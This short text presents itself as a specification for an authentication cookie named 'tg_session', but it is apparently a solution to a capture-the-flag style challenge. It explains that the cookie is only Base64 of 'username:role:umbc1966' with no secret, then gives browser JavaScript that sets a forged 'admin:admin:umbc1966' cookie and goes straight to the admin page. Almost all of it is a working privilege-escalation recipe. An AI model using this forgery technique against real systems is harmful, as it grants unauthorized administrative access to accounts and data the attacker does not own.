Authentication Cookie Specification

Cookie Name

tg_session

Value Format

Base64 or Base64‑URL of the ASCII string username:role:umbc1966.

  • username: arbitrary identifier
  • role: admin or user
  • umbc1966: literal suffix

Access Requirement

The decoded value must equal username:role:umbc1966 with role=admin.

Set Cookie

Compute the Base64 of admin:admin:umbc1966. Set the cookie and navigate to the admin page:

document.cookie = "tg_session=<BASE64_OF_admin:admin:umbc1966>; Path=/";
location.href = "/admin";
